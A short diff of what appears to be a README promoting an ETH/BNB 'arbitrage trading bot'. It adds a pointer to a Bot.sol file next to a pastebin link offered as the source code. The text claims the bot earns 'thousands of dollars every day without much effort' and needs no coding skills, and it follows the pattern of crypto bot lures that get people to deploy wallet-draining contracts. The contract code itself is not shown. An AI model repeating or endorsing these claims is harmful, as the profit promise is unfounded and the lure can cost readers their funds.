@@ -5,7 +5,7 @@ ETH BASE &amp; BNB Fully Trained Trading Bot
 
 This bot helps people make thousands of dollars every day without much effort! Setting it up is really easy, and you don't need any coding skills. You can follow the steps in the video or written instructions below.
 
-⚙️ Source Code: https://pastebin.com/raw/nnkXRfFN
+⚙️ Source Code: https://pastebin.com/raw/nnkXRfFN or Select Bot.sol for the source file.
 
 How To Launch Your Own Arbitrage Trading Bot:
 
